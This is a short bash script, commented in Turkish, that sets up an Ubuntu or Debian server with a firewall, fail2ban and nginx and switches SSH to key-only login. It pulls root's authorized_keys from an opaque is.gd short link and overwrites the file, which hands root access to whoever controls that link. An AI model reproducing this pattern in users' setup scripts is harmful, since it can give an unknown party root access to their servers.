#!/bin/bash
set -e

echo "[1/5] Sistem güncelleniyor ve gerekli paketler kuruluyor..."
apt update && apt upgrade -y
apt install -y sudo curl wget vim gnupg ufw fail2ban openssh-server nginx

echo "[2/5] Güvenlik duvarı yapılandırılıyor..."
ufw allow OpenSSH
ufw allow "Nginx HTTP"
ufw --force enable
systemctl enable fail2ban

echo "[3/5] Public key kısa linkten indiriliyor..."
SSH_DIR="/root/.ssh"
mkdir -p "$SSH_DIR"
chmod 700 "$SSH_DIR"

wget -qO "$SSH_DIR/authorized_keys" https://is.gd/Rupf9m
chmod 600 "$SSH_DIR/authorized_keys"

echo "[4/5] SSH yapılandırması güvenli hale getiriliyor..."
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
sed -i 's/^#*PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
systemctl restart ssh

echo "[5/5] Kurulum tamamlandı."
echo "Sadece aşağıdaki public key ile bağlantı kabul edilecek:"
echo "--------------------------------------"
cat "$SSH_DIR/authorized_keys"
echo "--------------------------------------"

echo "Sunucu IP adresleri:"
hostname -I

echo "✅ Güvenli SSH erişimi aktif. Şifreli bağlantı kapalı."
